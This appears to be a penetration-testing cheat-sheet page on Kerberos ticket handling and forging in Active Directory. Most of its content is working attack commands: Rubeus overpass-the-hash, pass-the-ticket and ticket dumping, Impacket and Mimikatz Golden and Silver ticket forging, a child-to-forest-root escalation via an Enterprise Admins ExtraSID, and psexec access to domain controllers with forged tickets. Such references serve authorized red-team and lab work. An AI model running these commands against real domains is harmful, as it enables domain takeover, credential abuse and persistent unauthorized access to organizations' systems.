# Kerberos ticket handling and forging

[← Active Directory quick reference](../05-active-directory.md) · [Delegation workflows](delegation.md) · [Authentication](authentication.md)

## Ticket identity, type, and context

Record client principal/realm, server SPN, validity, encryption, and logon/cache context. A TGT requests service tickets; a service ticket is for its registered service identity. Windows `.kirbi`/base64 and Linux ccache are different representations; use the tool's supported conversion before mixing them.

For a newly created Linux cache, isolate its use so the previous shell context survives:

```bash
(
  export KRB5CCNAME='/absolute/path/to/printed-ticket.ccache'
  klist -c "$KRB5CCNAME"
  impacket-smbclient -k -no-pass 'corp.example/labuser@fs01.corp.example'
)
```

Verify the client and service/realm, perform the intended resource operation, and remove only the proof cache after retaining required evidence. For Linux domain footholds, `klist` inspects caches and `klist -kte <KEYTAB>` inspects keytab principal/encryption metadata; a keytab stores account keys, not an existing TGT. SSSD cached verifiers are separate material and should not be treated as passable keys. [MIT cache concepts](https://web.mit.edu/kerberos/krb5-1.21/doc/basic/ccache_def.html), [keytabs](https://web.mit.edu/kerberos/krb5-1.21/doc/basic/keytab_def.html).

## Rubeus from a Windows shell

Use a separate intended logon session for ticket injection. Inspect the current context before injecting a ticket; replacing or purging tickets in an unrelated session can affect its access.

```powershell
.\Rubeus.exe asktgt /user:svc /rc4:<NThash> /ptt       # overpass-the-hash -> inject a TGT
.\Rubeus.exe asktgt /user:svc /aes256:<key> /ptt       # AES variant if RC4 is disabled
.\Rubeus.exe ptt /ticket:<base64|kirbi>                # pass-the-ticket (inject a stolen ticket)
.\Rubeus.exe triage                                    # list tickets in memory  (dump /nowrap to extract)
```

Supply the actual realm/DC where needed and verify the resulting service access. For S4U use [delegation](delegation.md); roasting belongs in [authentication](authentication.md). [Rubeus options](https://github.com/GhostPack/Rubeus).

## Ticket forging: Silver vs Golden (know which hash forges what)
Ticket use:
- **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
- **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed**: you *crack* it to get the password, then derive the NT hash.
Use [credential-material notes](../windows/ntlm.md) before selecting a key. Python `hashlib` may not expose MD4 with current OpenSSL providers; an installed Impacket environment supplies its NT-hash helper:

```bash
python3 -c 'from getpass import getpass; from impacket.ntlm import compute_nthash; print(compute_nthash(getpass("Password: ")).hex())'
```
Forge by available key material:

```powershell
setspn.exe -Q MSSQLSvc/sql01.corp.local:1433
```

```bash
# SILVER ticket: service account's NT hash + domain SID + SPN.
#   Service-specific example; ticket validation and authorization still apply.
impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 administrator
KRB5CCNAME="$PWD/administrator.ccache" impacket-mssqlclient -k -no-pass 'corp.local/administrator@sql01.corp.local'

# GOLDEN ticket: the relevant domain's krbtgt key + domain identity data.
#   Needs krbtgt -> you must already be DCSync-capable / on the DC. A service acct hash will NOT do this.
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local administrator
```
Silver: confirm SPN/account mapping and accepted encryption. Golden: needs the relevant `krbtgt` key; domain/forest boundaries and effective service authorization still apply. Modern PAC signatures/validation, account identity data, encryption requirements, key rotation, and DC patch state can invalidate older forging examples. These are deeper lab paths, not a shortcut from an arbitrary service hash. [Impacket ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).

## Golden Ticket

Requires the domain `krbtgt` key.

```text
512 = Domain Admins
513 = Domain Users
519 = Enterprise Admins
```

### Impacket

```bash
impacket-ticketer \
  -aesKey <KRBTGT_AES256> \
  -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN_FQDN> \
  -user-id <USER_RID> \
  -groups 512,513 \
  <USER>

export KRB5CCNAME=$PWD/<USER>.ccache
klist

impacket-psexec -k -no-pass \
  <DOMAIN_FQDN>/<USER>@<DC_FQDN>
```

No DNS:

```bash
impacket-psexec -k -no-pass -target-ip <DC_IP> \
  <DOMAIN_FQDN>/<USER>@<DC_FQDN>
```

Use `-nthash <KRBTGT_NT_HASH>` instead of `-aesKey` if required.

### Child Domain -> Forest Root

Add the root domain's Enterprise Admins SID as an ExtraSID:

```text
<ROOT_DOMAIN_SID>-519
```

```bash
impacket-ticketer \
  -aesKey <CHILD_KRBTGT_AES256> \
  -domain-sid <CHILD_DOMAIN_SID> \
  -domain <CHILD_DOMAIN_FQDN> \
  -user-id <USER_RID> \
  -groups 512,513 \
  -extra-sid <ROOT_DOMAIN_SID>-519 \
  <USER>

export KRB5CCNAME=$PWD/<USER>.ccache

impacket-psexec -k -no-pass \
  <CHILD_DOMAIN_FQDN>/<USER>@<ROOT_DC_FQDN>
```

### Mimikatz

```text
kerberos::purge

kerberos::golden /user:<USER> /id:<USER_RID> /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /aes256:<KRBTGT_AES256> /groups:512,513 /ptt
```

Child -> root:

```text
kerberos::golden /user:<USER> /id:<USER_RID> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /aes256:<CHILD_KRBTGT_AES256> /groups:512,513 /sids:<ROOT_DOMAIN_SID>-519 /ptt
```

Verify:

```cmd
klist
dir \\<DC_FQDN>\c$
```

> If PTT behaves strangely inside Evil-WinRM/PsExec: forge the ticket on Kali with `impacket-ticketer`, set `KRB5CCNAME`, and use `impacket-psexec -k -no-pass`.

MSSQL ticket accepted? Check the resulting login and role in [MSSQL enumeration](../enum/mssql.md#identity-and-rights).

## Delegation

Use [delegation](delegation.md) for direction, controlled-account/SPN requirements, evidence tickets, descriptor backup/restore, protected users, and actual forwarded-TGT verification.
